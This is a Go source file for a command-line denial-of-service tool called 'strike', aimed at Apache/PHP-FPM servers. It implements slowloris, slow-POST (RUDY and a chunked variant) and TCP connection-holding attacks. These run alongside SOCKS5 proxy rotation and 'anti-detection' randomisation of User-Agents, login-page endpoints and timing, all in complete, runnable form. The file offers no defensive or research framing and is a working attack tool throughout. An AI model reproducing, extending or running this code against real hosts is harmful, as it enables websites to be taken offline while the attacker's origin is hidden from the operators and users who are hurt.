package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

// Anti-detection: diverse User-Agents, endpoints, jitter
var userAgents = []string{
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
	"Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
	"Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
	"Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/126.0 Mobile/15E148 Safari/605.1.15",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
	"Mozilla/5.0 (Linux; Android 14; SM-A556B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
	"Mozilla/5.0 (Linux; Android 13; moto g54) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; Xiaomi 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
}

var endpoints = []string{
	"/login.php",
	"/login.php?ref=home",
	"/login.php?ref=email",
	"/login.php?utm_source=mobile",
	"/",
	"/login.php?r=%d",
}

var acceptLanguages = []string{
	"fr-FR,fr;q=0.9,en;q=0.8",
	"en-US,en;q=0.9",
	"fr-FR,fr;q=0.9",
	"en-GB,en;q=0.9,fr;q=0.7",
	"fr,en;q=0.8",
}

func pickUA() string  { return userAgents[rand.Intn(len(userAgents))] }
func pickLang() string { return acceptLanguages[rand.Intn(len(acceptLanguages))] }
func pickEndpoint() string {
	ep := endpoints[rand.Intn(len(endpoints))]
	if strings.Contains(ep, "%d") {
		ep = fmt.Sprintf(ep, rand.Intn(99999))
	}
	return ep
}
func jitter(base int) time.Duration {
	return time.Duration(base+rand.Intn(7)) * time.Second
}

var (
	mode      = flag.String("mode", "slowloris", "slowloris|rudy|tcphold")
	target    = flag.String("target", "", "host:port (e.g. example.com:443)")
	path      = flag.String("path", "/", "URL path")
	workers   = flag.Int("c", 30, "concurrent connections")
	delay     = flag.Int("delay", 10, "delay between bytes (seconds)")
	duration  = flag.Int("duration", 900, "max duration (seconds)")
	sni       = flag.String("sni", "", "TLS SNI (default: host from target)")
	proxyURL  = flag.String("proxy", "", "SOCKS5 proxy (e.g. socks5://127.0.0.1:9050)")
	proxyFile = flag.String("proxy-file", "", "file with SOCKS5 proxies (one per line, format: socks5://host:port)")
	proxyRefresh = flag.Int("proxy-refresh", 300, "refresh proxy list every N seconds")

	connects  uint64
	disconns  uint64
	bytesSent uint64
)

type ProxyRotator struct {
	mu       sync.Mutex
	proxies  []string
	dead     map[string]int // failure count
	index    int
	timeout  time.Duration
}

func NewProxyRotator(file string, timeout time.Duration) (*ProxyRotator, error) {
	r := &ProxyRotator{
		dead:    make(map[string]int),
		timeout: timeout,
	}
	if err := r.loadFile(file); err != nil {
		return nil, err
	}
	if len(r.proxies) == 0 {
		return nil, fmt.Errorf("no proxies loaded")
	}
	// Shuffle for initial diversity
	rand.Shuffle(len(r.proxies), func(i, j int) {
		r.proxies[i], r.proxies[j] = r.proxies[j], r.proxies[i]
	})
	fmt.Fprintf(os.Stderr, "[strike] loaded %d proxies\n", len(r.proxies))
	return r, nil
}

func (r *ProxyRotator) loadFile(file string) error {
	f, err := os.Open(file)
	if err != nil {
		return err
	}
	defer f.Close()
	var list []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if !strings.HasPrefix(line, "socks5://") {
			line = "socks5://" + line
		}
		list = append(list, line)
	}
	r.mu.Lock()
	r.proxies = list
	r.index = 0
	r.mu.Unlock()
	return nil
}

func (r *ProxyRotator) GetDialer() proxy.Dialer {
	r.mu.Lock()
	defer r.mu.Unlock()

	if len(r.proxies) == 0 {
		return proxy.Direct
	}

	// Try proxies until we find one not marked dead
	for attempts := 0; attempts < len(r.proxies); attempts++ {
		p := r.proxies[r.index]
		r.index = (r.index + 1) % len(r.proxies)

		if r.dead[p] >= 3 {
			continue
		}

		u, err := url.Parse(p)
		if err != nil {
			r.dead[p] = 999
			continue
		}

		d, err := proxy.FromURL(u, &net.Dialer{Timeout: r.timeout})
		if err != nil {
			r.dead[p] = 999
			continue
		}
		return d
	}
	// All proxies dead — try direct as last resort
	return proxy.Direct
}

func (r *ProxyRotator) MarkDead(proxyURL string) {
	r.mu.Lock()
	r.dead[proxyURL]++
	r.mu.Unlock()
}

func (r *ProxyRotator) refreshLoop(file string, interval time.Duration, stop <-chan struct{}) {
	t := time.NewTicker(interval)
	defer t.Stop()
	for {
		select {
		case <-t.C:
			if err := r.loadFile(file); err == nil {
				fmt.Fprintf(os.Stderr, "[strike] refreshed: %d proxies\n", len(r.proxies))
			}
		case <-stop:
			return
		}
	}
}

var globalRotator *ProxyRotator

func getDialer() proxy.Dialer {
	if globalRotator != nil {
		return globalRotator.GetDialer()
	}
	if *proxyURL != "" {
		u, err := url.Parse(*proxyURL)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[strike] bad proxy URL: %s\n", *proxyURL)
			os.Exit(1)
		}
		d, err := proxy.FromURL(u, proxy.Direct)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[strike] proxy error: %v\n", err)
			os.Exit(1)
		}
		return d
	}
	return proxy.Direct
}

func main() {
	flag.Parse()
	if *target == "" {
		fmt.Fprintf(os.Stderr, "strike - Apache/PHP-FPM DoS multi-mode\n\n")
		fmt.Fprintf(os.Stderr, "Usage:\n")
		fmt.Fprintf(os.Stderr, "  strike -mode slowloris -target host:443 -c 30\n")
		fmt.Fprintf(os.Stderr, "  strike -mode rudy -target host:443 -path /login.php -c 15\n")
		fmt.Fprintf(os.Stderr, "  strike -mode tcphold -target host:443 -c 20\n\n")
		fmt.Fprintf(os.Stderr, "Flags:\n")
		flag.PrintDefaults()
		os.Exit(1)
	}

	host, _, err := net.SplitHostPort(*target)
	if err != nil {
		host = *target
		*target = host + ":443"
	}
	if *sni == "" {
		*sni = host
	}

	deadline := time.Now().Add(time.Duration(*duration) * time.Second)

	// Initialize proxy rotator if -proxy-file is set
	if *proxyFile != "" {
		rot, err := NewProxyRotator(*proxyFile, 10*time.Second)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[strike] proxy-file error: %v\n", err)
		} else {
			globalRotator = rot
			stop := make(chan struct{})
			go rot.refreshLoop(*proxyFile, time.Duration(*proxyRefresh)*time.Second, stop)
			defer close(stop)
		}
	}

	fmt.Fprintf(os.Stderr, "[strike] mode=%s target=%s conns=%d delay=%ds duration=%ds\n",
		*mode, *target, *workers, *delay, *duration)

	// Stats goroutine
	go func() {
		tick := time.NewTicker(10 * time.Second)
		defer tick.Stop()
		for range tick.C {
			fmt.Fprintf(os.Stderr, "[strike] alive_conns=%d connected=%d sent=%dB\n",
				connects-disconns, connects, bytesSent)
		}
	}()

	switch *mode {
	case "slowloris":
		slowloris(deadline)
	case "rudy", "rudy-chunked":
		if *mode == "rudy-chunked" {
			rudyChunked(deadline)
		} else {
			rudy(deadline)
		}
	case "tcphold":
		tcpHold(deadline)
	default:
		fmt.Fprintf(os.Stderr, "unknown mode: %s\n", *mode)
		os.Exit(1)
	}
}

func tlsConfig() *tls.Config {
	return &tls.Config{
		ServerName:         *sni,
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
	}
}

// ========== Slowloris ==========

func slowloris(deadline time.Time) {
	var wg sync.WaitGroup
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			slowlorisWorker(id, deadline)
		}(i)
	}
	wg.Wait()
}

func slowlorisWorker(id int, deadline time.Time) {
	conf := tlsConfig()
	dialer := getDialer()
	// Prepare headers (we'll send these byte by byte)
	headers := fmt.Sprintf(
		"GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0\r\nAccept: */*\r\n",
		*path, *sni)

	for time.Now().Before(deadline) {
		raw, err := dialer.Dial("tcp", *target)
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		conn := tls.Client(raw, conf)
		if err := conn.Handshake(); err != nil {
			raw.Close()
			time.Sleep(2 * time.Second)
			continue
		}

		atomic.AddUint64(&connects, 1)
		alive := true

		// Send headers byte by byte
		for _, b := range []byte(headers) {
			if time.Now().After(deadline) {
				conn.Close()
				atomic.AddUint64(&disconns, 1)
				return
			}
			if _, err := conn.Write([]byte{b}); err != nil {
				alive = false
				break
			}
			atomic.AddUint64(&bytesSent, 1)
			time.Sleep(time.Duration(*delay) * time.Second)
		}

		// Keep connection alive with bogus headers
		for alive && time.Now().Before(deadline) {
			if _, err := conn.Write([]byte("X-a: b\r\n")); err != nil {
				break
			}
			atomic.AddUint64(&bytesSent, 7)
			time.Sleep(time.Duration(*delay) * time.Second)
		}
		conn.Close()
		atomic.AddUint64(&disconns, 1)
	}
}

// ========== RUDY (Slow POST) ==========

func rudy(deadline time.Time) {
	var wg sync.WaitGroup
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			rudyWorker(id, deadline)
		}(i)
	}
	wg.Wait()
}

func rudyWorker(id int, deadline time.Time) {
	conf := tlsConfig()
	dialer := getDialer()
	header := fmt.Sprintf(
		"POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 99999999\r\nUser-Agent: Mozilla/5.0 Chrome/121.0.0.0\r\nAccept: */*\r\n\r\n",
		*path, *sni)

	for time.Now().Before(deadline) {
		raw, err := dialer.Dial("tcp", *target)
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		conn := tls.Client(raw, conf)
		if err := conn.Handshake(); err != nil {
			raw.Close()
			time.Sleep(2 * time.Second)
			continue
		}

		atomic.AddUint64(&connects, 1)

		// Send headers at full speed
		if _, err := conn.Write([]byte(header)); err != nil {
			conn.Close()
			atomic.AddUint64(&disconns, 1)
			continue
		}

		// Send body 1 byte at a time, very slowly
		for time.Now().Before(deadline) {
			if _, err := conn.Write([]byte("X")); err != nil {
				break
			}
			atomic.AddUint64(&bytesSent, 1)
			time.Sleep(time.Duration(*delay) * time.Second)
		}
		conn.Close()
		atomic.AddUint64(&disconns, 1)
	}
}

// ========== TCP Hold ==========

func tcpHold(deadline time.Time) {
	var wg sync.WaitGroup
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			tcpHoldWorker(id, deadline)
		}(i)
	}
	wg.Wait()
}

func tcpHoldWorker(id int, deadline time.Time) {
	dialer := getDialer()
	for time.Now().Before(deadline) {
		conn, err := dialer.Dial("tcp", *target)
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		atomic.AddUint64(&connects, 1)

		// Hold TCP connection open, send nothing, block until server closes
		readDeadline := time.Now().Add(120 * time.Second)
		if readDeadline.After(deadline) {
			readDeadline = deadline
		}
		conn.SetReadDeadline(readDeadline)
		buf := make([]byte, 1)
		conn.Read(buf)
		conn.Close()
		atomic.AddUint64(&disconns, 1)
	}
}

// ========== RUDY Chunked ==========

func rudyChunked(deadline time.Time) {
	var wg sync.WaitGroup
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			rudyChunkedWorker(id, deadline)
		}(i)
	}
	wg.Wait()
}

func rudyChunkedWorker(id int, deadline time.Time) {
	conf := tlsConfig()
	dialer := getDialer()
	chunk := []byte("1\r\nX\r\n")

	for time.Now().Before(deadline) {
		ep := pickEndpoint()
		ua := pickUA()
		lang := pickLang()
		header := fmt.Sprintf(
			"POST %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8\r\nAccept-Language: %s\r\nAccept-Encoding: gzip, deflate, br\r\nReferer: https://%s/\r\n\r\n",
			ep, *sni, ua, lang, *sni)

		raw, err := dialer.Dial("tcp", *target)
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		conn := tls.Client(raw, conf)
		if err := conn.Handshake(); err != nil {
			raw.Close()
			time.Sleep(2 * time.Second)
			continue
		}

		atomic.AddUint64(&connects, 1)

		if _, err := conn.Write([]byte(header)); err != nil {
			conn.Close()
			atomic.AddUint64(&disconns, 1)
			continue
		}

		for time.Now().Before(deadline) {
			if _, err := conn.Write(chunk); err != nil {
				break
			}
			atomic.AddUint64(&bytesSent, uint64(len(chunk)))
			time.Sleep(jitter(*delay))
		}
		conn.Close()
		atomic.AddUint64(&disconns, 1)
	}
}
